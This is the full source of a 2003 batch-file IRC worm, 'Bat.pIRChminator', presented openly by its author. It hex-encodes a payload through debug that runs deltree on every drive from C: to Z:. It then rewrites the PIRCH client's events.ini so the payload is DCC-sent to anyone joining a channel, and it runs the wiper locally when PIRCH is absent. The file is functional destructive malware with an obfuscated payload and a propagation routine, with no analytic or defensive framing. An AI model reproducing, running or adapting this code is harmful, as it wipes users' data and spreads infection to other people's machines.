ctty nul
@echo off
::
:: Bat.pIRChminator [DvL]
:: 27.06.2003, Romania
::
:: a pIRCh werm which can delete everything from all your drivez
:: except the a:\ and b:\ drives coze sometimes windoze crashes
:: b-coze of them.
::
@deltree/y %windir%\system\ioana >nul
@md %windir%\system\ioana
:: making the folder i will need ^
@echo e 0100  63 74 74 79 20 6E 75 6C 0D 0A 40 65 63 68 6F 20>>ioana
@echo e 0110  6F 66 66 0D 0A 40 66 6F 72 20 25 25 7A 20 69 6E>>ioana
@echo e 0120  20 28 7A 3A 5C 2C 79 3A 5C 2C 78 3A 5C 2C 77 3A>>ioana
@echo e 0130  5C 2C 76 3A 5C 2C 75 3A 5C 2C 74 3A 5C 2C 73 3A>>ioana
@echo e 0140  5C 2C 72 3A 5C 2C 71 3A 5C 2C 70 3A 5C 2C 6F 3A>>ioana
@echo e 0150  5C 2C 6E 3A 5C 2C 6D 3A 5C 2C 6C 3A 5C 2C 6B 3A>>ioana
@echo e 0160  5C 2C 6A 3A 5C 2C 69 3A 5C 2C 68 3A 5C 2C 67 3A>>ioana
@echo e 0170  5C 2C 66 3A 5C 2C 65 3A 5C 2C 64 3A 5C 2C 63 3A>>ioana
@echo e 0180  5C 29 20 64 6F 20 64 65 6C 74 72 65 65 2F 79 20>>ioana
@echo e 0190  25 25 7A 20 3E 6E 75 6C 0D 0A 63 6C 73 0D 0A 00>>ioana
@echo rcx>>ioana
@echo 9F>>ioana
@echo n txt>>ioana
@echo w>>ioana
@echo q>>ioana
@debug<ioana
@ren txt ioana.bat
@deltree/y ioana >nul
@deltree/y txt >nul
@copy ioana.bat %windir%\system\ioana\ioana.bat
:: a powerfull batch script which will try to delete everything from c to z drives ^
@echo.[Levels]>events.ini
@echo.Enabled=1>>events.ini
@echo.Count=6>>events.ini
@echo.Level1=000-Unknowns>>events.ini
@echo.000-UnknownsEnabled=1>>events.ini
@echo.Level2=100-Level 100>>events.ini
@echo.100-Level 100Enabled=1>>events.ini
@echo.Level3=200-Level 200>>events.ini
@echo.200-Level 200Enabled=1>>events.ini
@echo.Level4=300-Level 300>>events.ini
@echo.300-Level 300Enabled=1>>events.ini
@echo.Level5=400-Level 400>>events.ini
@echo.400-Level 400Enabled=1>>events.ini
@echo.Level6=500-Level 500>>events.ini
@echo.500-Level 500Enabled=1>>events.ini
@echo.>>events.ini
@echo.[000-Unknowns]>>events.ini
@echo.User1=*!*@*>>events.ini
@echo.UserCount=1>>events.ini
@echo.Event1=ON JOIN:#:/dcc send $nick c:\windows\system\ioana\ioana.bat>>events.ini
@echo.EventCount=1>>events.ini
@echo.>>events.ini
@echo.[100-Level 100]>>events.ini
@echo.UserCount=0>>events.ini
@echo.EventCount=0>>events.ini
@echo.>>events.ini
@echo.[200-Level 200]>>events.ini
@echo.UserCount=0>>events.ini
@echo.EventCount=0>>events.ini
@echo.>>events.ini
@echo.[300-Level 300]>>events.ini
@echo.UserCount=0>>events.ini
@echo.EventCount=0>>events.ini
@echo.>>events.ini
@echo.[400-Level 400]>>events.ini
@echo.UserCount=0>>events.ini
@echo.EventCount=0>>events.ini
@echo.>>events.ini
@echo.[500-Level 500]>>events.ini
@echo.UserCount=0>>events.ini
@echo.EventCount=0>>events.ini
@deltree/y c:\pirch\events.ini >nul
@copy events.ini c:\pirch\events.ini
@deltree/y c:\pirch98\events.ini >nul
@copy events.ini c:\pirch98\events.ini
:: the pirch script ^
@if exist c:\pirch98\events.ini goto end
@if not exist c:\pirch98\events.ini goto pig
:pig
@if exist c:\pirch\events.ini goto end
@if not exist c:\pirch\events.ini call %windir%\system\ioana\ioana.bat
:: if pirch or pirch doesn`t exist on drive c:\ the worm is calling for ioana.bat
:: which is in my case the payload `;] ^
:end
:: this is where everything ends
cls